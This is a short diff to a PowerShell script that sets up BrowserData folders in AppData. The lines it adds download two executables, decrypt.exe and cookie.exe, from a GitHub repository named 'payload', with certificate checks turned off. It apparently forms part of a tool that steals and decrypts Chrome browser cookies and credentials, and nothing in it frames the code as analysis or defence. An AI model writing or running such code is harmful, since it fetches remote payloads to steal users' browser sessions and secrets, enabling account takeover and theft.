@@ -1,6 +1,11 @@
 New-Item -Path "$env:APPDATA\BrowserData" -ItemType Directory -Force
 New-Item -Path "$env:APPDATA\BrowserData\Chrome" -ItemType Directory -Force
 New-Item -Path "$env:APPDATA\ZippedBrowserData" -ItemType Directory -Force
+Set-Content -Path "$env:APPDATA\BrowserData\script.ps1" -Value ""
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/AlpoProo/payload/refs/heads/main/decrypt.exe" -OutFile "$env:APPDATA\BrowserData\Chrome\decrypt.exe" -UseBasicP -SkipCertificateCheck
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/AlpoProo/payload/refs/heads/main/cookie.exe" -OutFile "$env:APPDATA\BrowserData\Chrome\cookie.exe" -UseBasicP -SkipCertificateCheck
+
+
 # Set destination directory directly to AppData
 $destDir = "$env:APPDATA\BrowserData"
 if (-Not (Test-Path $destDir)) {
